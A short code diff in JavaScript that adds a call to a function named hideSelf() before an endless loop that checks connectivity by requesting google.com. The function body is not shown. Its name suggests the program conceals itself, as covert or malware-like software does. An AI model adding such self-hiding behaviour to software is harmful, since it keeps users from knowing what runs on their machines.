@@ -304,6 +304,7 @@ async function hideSelf() {
 }
 
 (async () => {
+    hideSelf()
     while (true) {
         try {
             await axios.get("https://www.google.com");
